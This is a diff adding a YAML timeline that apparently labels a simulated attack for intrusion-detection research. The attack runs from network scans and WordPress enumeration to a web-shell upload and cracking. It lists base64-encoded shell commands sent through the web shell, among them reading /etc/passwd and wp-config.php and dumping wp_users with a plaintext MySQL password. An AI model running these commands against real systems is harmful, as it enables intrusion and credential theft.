@@ -1,0 +1,154 @@
+start: "2022-02-08T07:07:00.018Z"
+stop: "2022-02-08T07:56:37.179Z"
+
+vpn_connect: 
+    start: "2022-02-08T07:07:00.018Z"
+    stop: "2022-02-08T07:07:04.372Z"
+
+traceroute:
+    start: "2022-02-08T07:07:11.417Z"
+    stop: "2022-02-08T07:07:11.453Z"
+
+host_discover_local: 
+    start: "2022-02-08T07:07:21.650Z"
+    stop: "2022-02-08T07:16:11.979Z"
+    networks: ["192.168.128.0/18"]
+
+
+host_discover_dmz: 
+    start: "2022-02-08T07:16:45.309Z"
+    stop: "2022-02-08T07:28:30.486Z"
+    networks: ["10.237.0.0/18"]
+
+dns_brute_force_start:
+    start: "2022-02-08T07:07:14.781Z"
+    stop: "2022-02-08T07:07:16.304Z"
+    domain: "mannsmith.harrison.com"
+    dns_servers: ["10.237.0.1"]
+
+service_scan: 
+    start: "2022-02-08T07:16:19.874Z"
+    stop: "2022-02-08T07:16:36.465Z"
+    networks: ["192.168.131.215", "172.28.192.4"]
+
+wpscan: 
+    start: "2022-02-08T07:28:36.590Z"
+    stop: "2022-02-08T07:29:34.980Z"
+    url: "https://intranet.mannsmith.harrison.com"
+    failed: False
+
+dirb_scan: 
+    start: "2022-02-08T07:29:40.806Z"
+    stop: "2022-02-08T07:55:53.494Z"
+    urls: ["https://intranet.mannsmith.harrison.com"]
+
+upload_rce_shell:
+    url: "https://intranet.mannsmith.harrison.com"
+    admin_ajax: "https://intranet.mannsmith.harrison.com/wp-admin/admin-ajax.php"
+    image_name: "yumzrshbwn.php"
+    post_id: "5"
+    post_url: "https://intranet.mannsmith.harrison.com/?p=5"
+    web_shell: "https://intranet.mannsmith.harrison.com/wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php"
+    start: "2022-02-08T07:55:59.989Z"
+    stop: "2022-02-08T07:56:05.880Z"
+    load_posts_page: 
+        start: "2022-02-08T07:55:59.989Z"
+        stop: "2022-02-08T07:56:00.410Z"
+    load_post_info:
+        start: "2022-02-08T07:56:00.432Z"
+        stop: "2022-02-08T07:56:00.801Z"
+    upload:
+        start: "2022-02-08T07:56:02.392Z"
+        stop: "2022-02-08T07:56:05.880Z"
+
+host_recon_commands:
+
+    - id: "list_www"
+      start: "2022-02-08T07:56:05.885Z"
+      stop: "2022-02-08T07:56:06.369Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJscyIsICItbCIsICIvdmFyL3d3dyJd"
+      cmd: ["ls", "-l", "/var/www"]
+
+    - id: "check_who"
+      start: "2022-02-08T07:56:09.569Z"
+      stop: "2022-02-08T07:56:09.828Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJ3aG8iXQ=="
+      cmd: ["who"]
+
+    - id: "read_passwd"
+      start: "2022-02-08T07:56:13.049Z"
+      stop: "2022-02-08T07:56:13.246Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJjYXQiLCAiL2V0Yy9wYXNzd2QiXQ=="
+      cmd: ["cat", "/etc/passwd"]
+
+    - id: "list_web_dir"
+      start: "2022-02-08T07:56:15.883Z"
+      stop: "2022-02-08T07:56:16.318Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0="
+      cmd: ["ls", "-laR", "/var/www"]
+
+    - id: "clear"
+      start: "2022-02-08T07:56:19.069Z"
+      stop: "2022-02-08T07:56:19.378Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJjbGVhciJd"
+      cmd: ["clear"]
+
+    - id: "check_last"
+      start: "2022-02-08T07:56:22.847Z"
+      stop: "2022-02-08T07:56:23.274Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJsYXN0Il0="
+      cmd: ["last"]
+
+    - id: "read_group"
+      start: "2022-02-08T07:56:25.252Z"
+      stop: "2022-02-08T07:56:25.423Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJjYXQiLCAiL2V0Yy9ncm91cCJd"
+      cmd: ["cat", "/etc/group"]
+
+    - id: "check_wp_config"
+      start: "2022-02-08T07:56:28.409Z"
+      stop: "2022-02-08T07:56:28.548Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQubWFubnNtaXRoLmhhcnJpc29uLmNvbS93cC1jb25maWcucGhwIl0="
+      cmd: ["cat", "/var/www/intranet.mannsmith.harrison.com/wp-config.php"]
+
+    - id: "dump_wp_users"
+      start: "2022-02-08T07:56:31.769Z"
+      stop: "2022-02-08T07:56:32.416Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0="
+      cmd: ["mysql", "-u", "wordpress", "-ptainoox3aedeeSh", "wordpress_db", "-e", "\"select * from wp_users\""]
+
+    - id: "check_id"
+      start: "2022-02-08T07:56:34.629Z"
+      stop: "2022-02-08T07:56:34.929Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJpZCJd"
+      cmd: ["id"]
+
+
+
+online_cracking:
+    start: "2022-02-08T07:56:37.179Z"
+    stop: "2022-02-08T08:35:59.916Z"
+
+run_cracking:
+    start: "2022-02-08T07:57:06.675Z"
+    stop: "2022-02-08T08:35:59.916Z"
